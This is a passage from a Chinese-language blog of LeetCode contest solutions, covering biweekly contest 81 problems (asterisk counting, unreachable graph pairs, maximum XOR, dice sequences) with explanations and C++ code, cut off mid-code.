<ol start="3">
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n)$, 其中 $n$ 为数组的长度，只需要遍历数组两次即可完成。</li>
<li>空间复杂度：$O(n)$, 其中 $n$ 为数组的长度。</li>
</ul>
<h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><ul>
<li>参考: <a href="https://leetcode.cn/problems/sum-of-total-strength-of-wizards/solution/ji-suan-mei-ge-shu-zi-zuo-wei-zui-xiao-z-3jvr/">单调栈 + 计算贡献值</a><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> mod = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">totalStrength</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; strength)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = strength.<span class="built_in">size</span>();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 步骤1. 求左侧第一个 &lt;= x 的坐标，和右侧第一个 &lt; x 的坐标</span></span><br><span class="line">        stack&lt;<span class="type">int</span>&gt; st;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">left</span><span class="params">(n, <span class="number">-1</span>)</span>, <span class="title">right</span><span class="params">(n, n)</span></span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            <span class="keyword">while</span>(st.<span class="built_in">size</span>() &amp;&amp; strength[st.<span class="built_in">top</span>()] &gt; strength[i]) &#123; </span><br><span class="line">                right[st.<span class="built_in">top</span>()] = i;</span><br><span class="line">                st.<span class="built_in">pop</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(st.<span class="built_in">size</span>()) &#123;</span><br><span class="line">                left[i] = st.<span class="built_in">top</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            st.<span class="built_in">push</span>(i);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 步骤2. 准备前缀和 psum 和 前缀和的前缀和 ppsum</span></span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; psum = strength;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            psum[i] = (psum[i] + psum[i<span class="number">-1</span>]) % mod;</span><br><span class="line">        &#125;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; ppsum = psum;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            ppsum[i] = (ppsum[i] + ppsum[i<span class="number">-1</span>]) % mod;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">auto</span> f = [&amp;](<span class="type">int</span> l, <span class="type">int</span> r) &#123;</span><br><span class="line">            <span class="keyword">if</span>(r &lt; <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span>(l &lt; <span class="number">0</span>) <span class="keyword">return</span> ppsum[r];</span><br><span class="line">            <span class="keyword">return</span> (ppsum[r] - ppsum[l] + mod) % mod;</span><br><span class="line">        &#125;;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 步骤3. 针对每个 min 值计算结果</span></span><br><span class="line">        <span class="comment">// 对于 a[i], 其管辖区间为 [left[i] + 1, right[i] - 1]</span></span><br><span class="line">        <span class="comment">// 问题归结, 将 l = left[i] + 1, r = right[i] - 1 代入上面的式子求解即可</span></span><br><span class="line">        <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            <span class="type">int</span> l = left[i] + <span class="number">1</span>, r = right[i] - <span class="number">1</span>;</span><br><span class="line">            <span class="type">int</span> sleft = <span class="number">1ll</span> * <span class="built_in">f</span>(l<span class="number">-2</span>, i<span class="number">-1</span>) * (r - i + <span class="number">1</span>) % mod;</span><br><span class="line">            <span class="type">int</span> sright = <span class="number">1ll</span> * <span class="built_in">f</span>(i<span class="number">-1</span>, r) * (i - l + <span class="number">1</span>) % mod;</span><br><span class="line">            res += <span class="number">1ll</span> * strength[i] * (((sright - sleft) + mod) % mod) % mod;</span><br><span class="line">            res %= mod;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
<li>单调栈 + 动态规划<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">totalStrength</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; strength)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = strength.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> mod = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">long</span> <span class="type">long</span>&gt; <span class="title">rminsum</span><span class="params">(n + <span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">long</span> <span class="type">long</span>&gt; <span class="title">sum</span><span class="params">(n + <span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">long</span> <span class="type">long</span>&gt; <span class="title">ssum</span><span class="params">(n + <span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">long</span> <span class="type">long</span>&gt; <span class="title">dp</span><span class="params">(n + <span class="number">1</span>)</span></span>;</span><br><span class="line">        stack&lt;pair&lt;<span class="type">int</span>,<span class="type">int</span>&gt;&gt; st;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            sum[i + <span class="number">1</span>] = (strength[i] + sum[i]) % mod;</span><br><span class="line">            ssum[i + <span class="number">1</span>] = (sum[i + <span class="number">1</span>] + ssum[i]) % mod;</span><br><span class="line">        &#125;</span><br><span class="line">        st.<span class="built_in">emplace</span>(<span class="number">0</span>, n);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = n - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="keyword">while</span> (!st.<span class="built_in">empty</span>() &amp;&amp; strength[i] &lt;= st.<span class="built_in">top</span>().first) &#123;</span><br><span class="line">                st.<span class="built_in">pop</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">int</span> j = st.<span class="built_in">top</span>().second;</span><br><span class="line">            rminsum[i] = (rminsum[j] + (<span class="type">long</span> <span class="type">long</span>)(j - i) * (<span class="type">long</span> <span class="type">long</span>)strength[i]) % mod;</span><br><span class="line">            dp[i] = (dp[j] + rminsum[j] * (sum[j] - sum[i])) % mod;</span><br><span class="line">            dp[i] = (dp[i] + mod + ((ssum[j] - ssum[i] - ((<span class="type">long</span> <span class="type">long</span>)(j - i) * sum[i])) % mod) * strength[i] % mod) % mod;        </span><br><span class="line">            st.<span class="built_in">emplace</span>(strength[i], i);</span><br><span class="line">            ans = (ans + dp[i]) % mod;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>力扣周赛</category>
      </categories>
      <tags>
        <tag>力扣周赛</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode  contest biweekly 81</title>
    <url>/2022/01/01/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/11/</url>
    <content><![CDATA[<h2 id="leetcode-contest-biweekly-81"><a href="#leetcode-contest-biweekly-81" class="headerlink" title="leetcode  contest biweekly 81"></a>leetcode  contest biweekly 81</h2><p>虽然是手速题，结果写完了，发现已经掉到 <code>200</code> 名了，真心太菜了。</p>
<h3 id="6104-统计星号"><a href="#6104-统计星号" class="headerlink" title="6104. 统计星号"></a>6104. 统计星号</h3><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>给你一个字符串 <code>s</code> ，每 两个 连续竖线 <code>&#39;|&#39;</code> 为 一对 。换言之，第一个和第二个 <code>&#39;|&#39;</code> 为一对，第三个和第四个 <code>&#39;|&#39;</code> 为一对，以此类推。</p>
<p>请你返回 不在 竖线对之间，s 中 <code>&#39;*&#39;</code> 的数目。</p>
<p>注意，每个竖线 <code>&#39;|&#39;</code> 都会 恰好 属于一个对。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;l|*e*et|c**o|*de|&quot;</span><br><span class="line">输出：2</span><br><span class="line">解释：不在竖线对之间的字符加粗加斜体后，得到字符串：&quot;l|*e*et|c**o|*de|&quot; 。</span><br><span class="line">第一和第二条竖线 &#x27;|&#x27; 之间的字符不计入答案。</span><br><span class="line">同时，第三条和第四条竖线 &#x27;|&#x27; 之间的字符也不计入答案。</span><br><span class="line">不在竖线对之间总共有 2 个星号，所以我们返回 2 。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;iamprogrammer&quot;</span><br><span class="line">输出：0</span><br><span class="line">解释：在这个例子中，s 中没有星号。所以返回 0 。</span><br></pre></td></tr></table></figure>
<p>示例 3：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;yo|uar|e**|b|e***au|tifu|l&quot;</span><br><span class="line">输出：5</span><br><span class="line">解释：需要考虑的字符加粗加斜体后：&quot;yo|uar|e**|b|e***au|tifu|l&quot; 。不在竖线对之间总共有 5 个星号。所以我们返回 5 。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>1 &lt;= s.length &lt;= 1000</code></li>
<li><code>s</code> 只包含小写英文字母，竖线 <code>&#39;|&#39;</code> 和星号 <code>&#39;*&#39;</code> 。</li>
<li><code>s</code> 包含 偶数 个竖线 <code>&#39;|&#39;</code> 。</li>
</ul>
<p>提示：</p>
<ul>
<li><code>1 &lt;= s.length &lt;= 1000</code></li>
<li><code>s</code> 由小写和大写英文字母组成</li>
</ul>
<h4 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/biweekly-contest-81/problems/count-asterisks/">https://leetcode.cn/contest/biweekly-contest-81/problems/count-asterisks/</a></p>
<h4 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h4><pre><code>直接遍历
</code></pre>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol>
<li>题目出的比较稀烂，反正暴力即可，先将相邻的 <code>|</code> 之间的 <code>*</code> 全部去掉，然后再统计字符串中的 <code>*</code> 即可。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n)$, 其中 $n$ 为字符串的长度。</li>
<li>空间复杂度：$O(n)$，其中 $n$ 为字符串的长度。</li>
</ul>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">countAsterisks</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; arr;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; s.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (s[i] == <span class="string">&#x27;|&#x27;</span>)&#123;</span><br><span class="line">                arr.<span class="built_in">emplace_back</span>(i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; arr.<span class="built_in">size</span>(); i += <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = arr[i]; i + <span class="number">1</span> &lt; arr.<span class="built_in">size</span>() &amp;&amp; j &lt;= arr[i + <span class="number">1</span>]; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (s[j] == <span class="string">&#x27;*&#x27;</span>) &#123;</span><br><span class="line">                    s[j] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; s.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (s[i] == <span class="string">&#x27;*&#x27;</span>) &#123;</span><br><span class="line">                ans++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6106-统计无向图中无法互相到达点对数"><a href="#6106-统计无向图中无法互相到达点对数" class="headerlink" title="6106. 统计无向图中无法互相到达点对数"></a>6106. 统计无向图中无法互相到达点对数</h3><h4 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h4><p>给你一个整数 <code>n</code> ，表示一张 无向图 中有 <code>n</code> 个节点，编号为 <code>0</code> 到 <code>n - 1</code> 。同时给你一个二维整数数组 <code>edges</code> ，其中 <code>edges[i] = [ai, bi]</code> 表示节点<code>ai</code>和 <code>bi</code> 之间有一条 无向 边。</p>
<p>请你返回 无法互相到达 的不同 点对数目 。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：n = 3, edges = [[0,1],[0,2],[1,2]]</span><br><span class="line">输出：0</span><br><span class="line">解释：所有点都能互相到达，意味着没有点对无法互相到达，所以我们返回 0 。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：n = 7, edges = [[0,2],[0,5],[2,4],[1,6],[5,4]]</span><br><span class="line">输出：14</span><br><span class="line">解释：总共有 14 个点对互相无法到达：</span><br><span class="line">[[0,1],[0,3],[0,6],[1,2],[1,3],[1,4],[1,5],[2,3],[2,6],[3,4],[3,5],[3,6],[4,6],[5,6]]</span><br><span class="line">所以我们返回 14 。</span><br></pre></td></tr></table></figure>
<p>提示：</p>
<ul>
<li><code>1 &lt;= n &lt;= 105</code></li>
<li><code>0 &lt;= edges.length &lt;= 2 * 105</code></li>
<li><code>edges[i].length == 2</code></li>
<li><code>0 &lt;= ai, bi &lt; n</code></li>
<li><code>ai != bi</code></li>
<li>不会有重复边。</li>
</ul>
<h4 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/biweekly-contest-81/problems/count-unreachable-pairs-of-nodes-in-an-undirected-graph/">https://leetcode.cn/contest/biweekly-contest-81/problems/count-unreachable-pairs-of-nodes-in-an-undirected-graph/</a></p>
<h4 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h4><pre><code>BFS
</code></pre>
<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><ol>
<li>典型的图的问题，首先求图中的所有连通区域的数目，我们可以用简单的 <code>BFS</code> 或者 <code>UNION</code> 均可，求出所有的联通区域包含节点的个数的数组为 $arr$，设联通区域的数目为 $n$ 个。则根据组合数组中的抽样定理可以知道，所有可能的点对的数目为:<br>$$<br>tot &#x3D; \sum_{i&#x3D;0}^{n}(arr[i] \times \sum_{j&#x3D;0}^{i-1}arr[j])<br>$$</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n)$，其中 $n$ 为节点的数目。</li>
<li>空间复杂度：$O(n)$，其中 $n$ 为节点的数目。</li>
</ul>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">countPairs</span><span class="params">(<span class="type">int</span> n, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; edges)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; dp;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">visit</span><span class="params">(n, <span class="literal">false</span>)</span></span>;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">graph</span>(n);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> v : edges) &#123;</span><br><span class="line">            graph[v[<span class="number">0</span>]].<span class="built_in">emplace_back</span>(v[<span class="number">1</span>]);</span><br><span class="line">            graph[v[<span class="number">1</span>]].<span class="built_in">emplace_back</span>(v[<span class="number">0</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (visit[i]) <span class="keyword">continue</span>;</span><br><span class="line">            queue&lt;<span class="type">int</span>&gt; qu;</span><br><span class="line">            qu.<span class="built_in">emplace</span>(i);</span><br><span class="line">            visit[i] = <span class="literal">true</span>;</span><br><span class="line">            <span class="type">int</span> total = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span>(!qu.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">                <span class="type">int</span> curr = qu.<span class="built_in">front</span>();</span><br><span class="line">                qu.<span class="built_in">pop</span>();</span><br><span class="line">                total++;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">auto</span> next : graph[curr]) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (visit[next]) <span class="keyword">continue</span>;</span><br><span class="line">                    qu.<span class="built_in">emplace</span>(next);</span><br><span class="line">                    visit[next] = <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            dp.<span class="built_in">emplace_back</span>(total);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> sum = dp[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; dp.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            ans += sum * dp[i];</span><br><span class="line">            sum += dp[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6105-操作后的最大异或和"><a href="#6105-操作后的最大异或和" class="headerlink" title="6105. 操作后的最大异或和"></a>6105. 操作后的最大异或和</h3><h4 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h4><p>给你一个下标从 <code>0</code> 开始的整数数组 <code>nums</code> 。一次操作中，选择 任意 非负整数 <code>x</code> 和一个下标 <code>i</code> ，更新 <code>nums[i]</code> 为 <code>nums[i] AND (nums[i] XOR x)</code> 。</p>
<p>注意，<code>AND</code> 是逐位与运算，<code>XOR</code> 是逐位异或运算。</p>
<p>请你执行 任意次 更新操作，并返回 <code>nums</code> 中所有元素 最大 逐位异或和。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [3,2,4,6]</span><br><span class="line">输出：7</span><br><span class="line">解释：选择 x = 4 和 i = 3 进行操作，num[3] = 6 AND (6 XOR 4) = 6 AND 2 = 2 。</span><br><span class="line">现在，nums = [3, 2, 4, 2] 且所有元素逐位异或得到 3 XOR 2 XOR 4 XOR 2 = 7 。</span><br><span class="line">可知 7 是能得到的最大逐位异或和。</span><br><span class="line">注意，其他操作可能也能得到逐位异或和 7 。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [1,2,3,9,2]</span><br><span class="line">输出：11</span><br><span class="line">解释：执行 0 次操作。</span><br><span class="line">所有元素的逐位异或和为 1 XOR 2 XOR 3 XOR 9 XOR 2 = 11 。</span><br><span class="line">可知 11 是能得到的最大逐位异或和。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>1 &lt;= nums.length &lt;= 105</code></li>
<li><code>0 &lt;= nums[i] &lt;= 108</code></li>
</ul>
<h4 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/biweekly-contest-81/problems/maximum-xor-after-operations/">https://leetcode.cn/contest/biweekly-contest-81/problems/maximum-xor-after-operations/</a></p>
<h4 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h4><pre><code>数学问题，贪心算法
</code></pre>
<h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><ol>
<li>简单的数学问题，由于题目中明确说了 <code>x</code> 可以为任意值，这就很好办，<code>nums[i] XOR x</code> 可以变为任何值，<code>nums[i] AND (nums[i] XOR x)</code> 则表明我们可以保留 <code>nums[i]</code> 中数位为 <code>1</code> 的任何一位，因此我们统计数组中所有的数中数位出为 <code>1</code> 出现的个数，只要是某个数位上存在某个元素该数位为 <code>1</code> 则我们一定可以将其保留，问题最终转变为统计所有的数位即可，然后将所有出现过的数位全部置为 <code>1</code> 即可得到最大值。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(C \times n)$, $n$ 表示数组的数目。</li>
<li>空间复杂度：$O(C)$，$C$ 表示数位的数目。</li>
</ul>
<h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maximumXOR</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">cnt</span><span class="params">(<span class="number">32</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> v : nums) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (v &amp; (<span class="number">1</span> &lt;&lt; i)) &#123;</span><br><span class="line">                    cnt[i] = <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (cnt[i]) &#123;</span><br><span class="line">                ans |= (<span class="number">1</span> &lt;&lt; i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h3 id="6107-不同骰子序列的数目"><a href="#6107-不同骰子序列的数目" class="headerlink" title="6107. 不同骰子序列的数目"></a>6107. 不同骰子序列的数目</h3><h4 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h4><p>给你一个整数 <code>n</code> 。你需要掷一个 <code>6</code> 面的骰子 <code>n</code> 次。请你在满足以下要求的前提下，求出 不同 骰子序列的数目：</p>
<ul>
<li>序列中任意 相邻 数字的 最大公约数 为 <code>1</code> 。<br>序列中 相等 的值之间，至少有 <code>2</code> 个其他值的数字。正式地，如果第 <code>i </code>次掷骰子的值 等于 第 <code>j</code> 次的值，那么 abs(<code>i</code> - <code>j</code>) &gt; 2 。<br>请你返回不同序列的 总数目 。由于答案可能很大，请你将答案对 <code>109 + 7</code> 取余 后返回。</li>
</ul>
<p>如果两个序列中至少有一个元素不同，那么它们被视为不同的序列。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：n = 4</span><br><span class="line">输出：184</span><br><span class="line">解释：一些可行的序列为 (1, 2, 3, 4) ，(6, 1, 2, 3) ，(1, 2, 3, 1) 等等。</span><br><span class="line">一些不可行的序列为 (1, 2, 1, 3) ，(1, 2, 3, 6) 。</span><br><span class="line">(1, 2, 1, 3) 是不可行的，因为第一个和第三个骰子值相等且 abs(1 - 3) = 2 （下标从 1 开始表示）。</span><br><span class="line">(1, 2, 3, 6) i是不可行的，因为 3 和 6 的最大公约数是 3 。</span><br><span class="line">总共有 184 个不同的可行序列，所以我们返回 184 。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：n = 2</span><br><span class="line">输出：22</span><br><span class="line">解释：一些可行的序列为 (1, 2) ，(2, 1) ，(3, 2) 。</span><br><span class="line">一些不可行的序列为 (3, 6) ，(2, 4) ，因为最大公约数不为 1 。</span><br><span class="line">总共有 22 个不同的可行序列，所以我们返回 22 。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>1 &lt;= n &lt;= 104</code></li>
</ul>
<h4 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/biweekly-contest-81/problems/number-of-distinct-roll-sequences/">https://leetcode.cn/contest/biweekly-contest-81/problems/number-of-distinct-roll-sequences/</a></p>
<h4 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h4><pre><code>动态规划
</code></pre>
<h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><ol>
<li>典型的动态规划，我们设 $dp[i][j][k]$ 表示抛掷骰子 $i$ 次且倒数第一次和第二次的数字为 $j,k$ 的序列数目，则可以知道如下递推公式:<br>$$<br>dp[i][j][k] &#x3D; \sum_{p&#x3D;1}^{6}dp[i-1][k][p] \qquad(j \neq k, k \neq p, j \neq p, \gcd(j,k) &#x3D; 1, \gcd(k,p) &#x3D; 1)<br>$$<br>按照上述的递推公式即可得到所有可能的组合,需要对过程变量和最终结果取模即可。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$n \times C^3 $， $n$ 表示抛掷次数, $C &#x3D; 6$  为骰子的取值范围。</li>
<li>空间复杂度：$n \times C^2$, $n$ 表示抛掷次数，$C &#x3D; 6$  为骰子的取值范围。</li>
</ul>
<h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">distinctSequences</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> mod = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">6</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        vector&lt;vector&lt;vector&lt;<span class="type">long</span> <span class="type">long</span>&gt;&gt;&gt; <span class="built_in">dp</span>(n + <span class="number">1</span>, vector&lt;vector&lt;<span class="type">long</span> <span class="type">long</span>&gt;&gt;(<span class="number">7</span>, <span class="built_in">vector</span>&lt;<span class="type">long</span> <span class="type">long</span>&gt;(<span class="number">7</span>)));</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">6</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= <span class="number">6</span>; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (__gcd(i,j) == <span class="number">1</span> &amp;&amp; i != j) &#123;</span><br><span class="line">                    dp[<span class="number">2</span>][i][j] = <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">3</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= <span class="number">6</span>; j++) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">1</span>; k &lt;= <span class="number">6</span>; k++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (__gcd(j, k) &gt; <span class="number">1</span> || j == k) <span class="keyword">continue</span>;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">int</span> m = <span class="number">1</span>; m &lt;= <span class="number">6</span>; m++) &#123;</span><br><span 